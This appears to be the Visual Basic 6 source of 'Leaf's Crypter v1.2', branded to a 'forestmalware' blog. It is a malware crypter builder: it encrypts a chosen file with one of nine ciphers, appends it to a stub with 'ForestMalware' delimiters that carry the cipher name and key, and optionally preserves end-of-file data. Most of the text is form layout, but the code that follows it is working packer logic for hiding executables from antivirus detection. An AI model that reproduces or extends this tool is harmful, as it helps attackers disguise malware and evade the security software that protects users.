VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form LeafsCrypter 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Leaf´s Crypter v1.2   [www.forestmalware.blogspot.com]"
   ClientHeight    =   6315
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   8505
   Icon            =   "Crypt.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6315
   ScaleWidth      =   8505
   StartUpPosition =   1  'CenterOwner
   Begin VB.TextBox txtStub 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008080&
      Height          =   615
      Left            =   2160
      TabIndex        =   1
      Text            =   "Select stub of your encrypt metod..."
      Top             =   3000
      Width           =   5295
   End
   Begin VB.CommandButton cmdFile 
      BackColor       =   &H00004040&
      Caption         =   "..."
      BeginProperty Font 
         Name            =   "DriftType"
         Size            =   20.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   7560
      MaskColor       =   &H00008080&
      Style           =   1  'Graphical
      TabIndex        =   3
      Top             =   1920
      Width           =   615
   End
   Begin VB.TextBox txtFile 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008080&
      Height          =   615
      Left            =   2160
      TabIndex        =   0
      Text            =   "Search Fil3 2 3ncrypt...."
      Top             =   1920
      Width           =   5295
   End
   Begin VB.CommandButton cmdRdm 
      BackColor       =   &H00004040&
      Caption         =   "Generate aleatory key"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   2280
      MaskColor       =   &H00004040&
      Style           =   1  'Graphical
      TabIndex        =   18
      Top             =   4680
      Width           =   3975
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      Caption         =   "3ncryptaciones:"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00004040&
      Height          =   3615
      Left            =   120
      TabIndex        =   8
      Top             =   1560
      Width           =   1815
      Begin VB.OptionButton optTwofish 
         BackColor       =   &H00000000&
         Caption         =   "Twofish"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   195
         Left            =   120
         TabIndex        =   17
         Top             =   3240
         Width           =   1095
      End
      Begin VB.OptionButton optBlowfish 
         BackColor       =   &H00000000&
         Caption         =   "Blowfish"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   195
         Left            =   120
         TabIndex        =   16
         Top             =   2880
         Width           =   1335
      End
      Begin VB.OptionButton optSkipjack 
         BackColor       =   &H00000000&
         Caption         =   "Skipjack"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   2520
         Width           =   1215
      End
      Begin VB.OptionButton optRijndael 
         BackColor       =   &H00000000&
         Caption         =   "Rijndael"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   195
         Left            =   120
         TabIndex        =   14
         Top             =   1800
         Width           =   1335
      End
      Begin VB.OptionButton optTEA 
         BackColor       =   &H00000000&
         Caption         =   "TEA"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   195
         Left            =   120
         TabIndex        =   13
         Top             =   2160
         Width           =   855
      End
      Begin VB.OptionButton optGost 
         BackColor       =   &H00000000&
         Caption         =   "Gost"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   1440
         Width           =   1215
      End
      Begin VB.OptionButton optDES 
         BackColor       =   &H00000000&
         Caption         =   "DES"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   1080
         Width           =   1095
      End
      Begin VB.OptionButton optRC4 
         BackColor       =   &H00000000&
         Caption         =   "RC4"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   195
         Left            =   120
         TabIndex        =   10
         Top             =   720
         Width           =   975
      End
      Begin VB.OptionButton optXOR 
         BackColor       =   &H00000000&
         Caption         =   "XOR"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   210
         Left            =   120
         TabIndex        =   9
         Top             =   360
         Value           =   -1  'True
         Width           =   975
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Caption         =   "End Of Fil3:"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008080&
      Height          =   615
      Left            =   6600
      TabIndex        =   6
      Top             =   4560
      Width           =   1335
      Begin VB.CheckBox chkEOF 
         BackColor       =   &H00000000&
         Caption         =   "EOF"
         BeginProperty Font 
            Name            =   "Technic"
            Size            =   9.75
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00008080&
         Height          =   255
         Left            =   360
         TabIndex        =   7
         Top             =   240
         Width           =   855
      End
   End
   Begin VB.CommandButton cmdEncrypt 
      BackColor       =   &H00004040&
      Caption         =   "¡¡ Do It !!"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   1200
      MaskColor       =   &H00004040&
      Style           =   1  'Graphical
      TabIndex        =   5
      Top             =   5520
      Width           =   5175
   End
   Begin VB.CommandButton cmdStub 
      BackColor       =   &H00004040&
      Caption         =   "..."
      BeginProperty Font 
         Name            =   "DriftType"
         Size            =   20.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   7560
      MaskColor       =   &H00008080&
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   3000
      Width           =   615
   End
   Begin VB.TextBox txtKey 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008080&
      Height          =   495
      Left            =   2280
      TabIndex        =   2
      Text            =   "Put a key 4 3ncrypt..."
      Top             =   4080
      Width           =   5655
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   7800
      Top             =   3960
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00000000&
      Caption         =   "Fil3 :"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00004040&
      Height          =   1095
      Left            =   2040
      TabIndex        =   19
      Top             =   1560
      Width           =   6255
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H00000000&
      Caption         =   "Stub :"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00004040&
      Height          =   1095
      Left            =   2040
      TabIndex        =   20
      Top             =   2640
      Width           =   6255
   End
   Begin VB.Frame Frame5 
      BackColor       =   &H00000000&
      Caption         =   "Password de 3ncryptacion :"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00004040&
      Height          =   1575
      Left            =   2040
      TabIndex        =   21
      Top             =   3720
      Width           =   6255
   End
   Begin VB.Frame Frame6 
      BackColor       =   &H00000000&
      Caption         =   "Encrypt :"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00004040&
      Height          =   975
      Left            =   120
      TabIndex        =   22
      Top             =   5160
      Width           =   8175
      Begin VB.CommandButton cmdAbout 
         BackColor       =   &H00004040&
         Caption         =   "About."
         BeginProperty Font 
            Name            =   "Harlow Solid Italic"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         Height          =   495
         Left            =   6360
         MaskColor       =   &H00004040&
         Style           =   1  'Graphical
         TabIndex        =   23
         Top             =   360
         Width           =   1575
      End
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "V 1.2"
      BeginProperty Font 
         Name            =   "Harlow Solid Italic"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008080&
      Height          =   255
      Left            =   6120
      TabIndex        =   24
      Top             =   1200
      Width           =   615
   End
   Begin VB.Image Image2 
      Height          =   1500
      Index           =   1
      Left            =   6720
      Picture         =   "Crypt.frx":08CA
      Top             =   120
      Width           =   1500
   End
   Begin VB.Image Image2 
      Height          =   1500
      Index           =   0
      Left            =   120
      Picture         =   "Crypt.frx":315C
      Top             =   120
      Width           =   1500
   End
   Begin VB.Image Image1 
      Height          =   2715
      Left            =   1560
      Picture         =   "Crypt.frx":59EE
      Top             =   -480
      Width           =   5445
   End
End
Attribute VB_Name = "LeafsCrypter"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Stub As String, File As String, EOF As String, Bin As String, Datas As String
Dim EnRC4 As New clsRC4
Dim EnBlowfish As New clsBlowfish
Dim EnTwofish As New clsTwofish
Dim EnSkipjack As New clsSkipjack
Dim EnTEA As New clsTEA
Dim EnDES As New clsDES
Dim EnXOR As New clsXOR
Dim EnGost As New clsGost
Dim EnRijndael As New clsRijndael

Const a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const b = "abcdefghijklmnopqrstuvwxyz"
Const c = "1234567890"



Private Sub cmdIcon_Click()
frmIcon.Show
End Sub


Private Sub cmdRdm_Click()
txtKey.Text = gkey
End Sub

Public Function gkey()
Dim cdea As String
Dim i As Integer

cdea = a + b + c

For i = 1 To 50
    gkey = gkey & Mid$(cdea, Int((Rnd * Len(cdea)) + 1), 1)
Next i
End Function

Private Sub cmdFile_Click()
With CD
.Filter = "All type of fil3s *.*|*.*"
.DialogTitle = "Select fil3 2 3ncrypt..."
.ShowOpen
End With
txtFile.Text = CD.Filename
If Dir(CD.Filename) = vbNullString Then Exit Sub
End Sub

Private Sub cmdStub_Click()
With CD
.Filter = "Crypter Stub .dll|*.dll"
.DialogTitle = "Select stub of crypt3r..."
.ShowOpen
End With
txtStub.Text = CD.Filename
If Dir(CD.Filename) = vbNullString Then Exit Sub
End Sub

Private Sub cmdEncrypt_Click()
With CD
.Filter = "All type of fil3s *.*|*.*"
.DialogTitle = "Place 2 save 3ncrypt file.."
.ShowSave
End With
Open txtStub.Text For Binary As 1
Stub = Space(LOF(1))
Get 1, , Stub
Close 1

If chkEOF.Value = 1 Then EOF = ReadEOFData(txtFile.Text)
Open txtFile.Text For Binary As 1
Bin = Space(LOF(1))
Get 1, , Bin
Close 1

If optXOR.Value = True Then
Bin = EnXOR.EncryptString(Bin, txtKey)
Encryptacion = "EnXOR"
End If
If optRC4.Value = True Then
Bin = EnRC4.EncryptString(Bin, txtKey)
Encryptacion = "EnRC4"
End If
If optDES.Value = True Then
Bin = EnDES.EncryptString(Bin, txtKey)
Encryptacion = "EnDES"
End If
If optGost.Value = True Then
Bin = EnGost.EncryptString(Bin, txtKey)
Encryptacion = "EnGost"
End If
If optRijndael.Value = True Then
Bin = EnRijndael.EncryptString(Bin, txtKey)
Encryptacion = "EnRijndael"
End If
If optTEA.Value = True Then
Bin = EnTEA.EncryptString(Bin, txtKey)
Encryptacion = "EnTEA"
End If
If optSkipjack.Value = True Then
Bin = EnSkipjack.EncryptString(Bin, txtKey)
Encryptacion = "EnSkipjack"
End If
If optBlowfish.Value = True Then
Bin = EnBlowfish.EncryptString(Bin, txtKey)
Encryptacion = "EnBlowfish"
End If
If optTwofish.Value = True Then
Bin = EnTwofish.EncryptString(Bin, txtKey)
Encryptacion = "EnTwofish"
End If

Datas = Stub & "ForestMalware" & Bin & "ForestMalware" & Encryptacion & "ForestMalware" & txtKey.Text & "ForestMalware"
Open CD.Filename For Binary As 1
Put 1, , Datas
Close 1

If chkEOF.Value = 1 Then Call WriteEOFData(CD.Filename, EOF)
MsgBox "Crypt Fil3 Complete"

End Sub

Private Sub cmdAbout_Click()
frmAbout.Show
End Sub

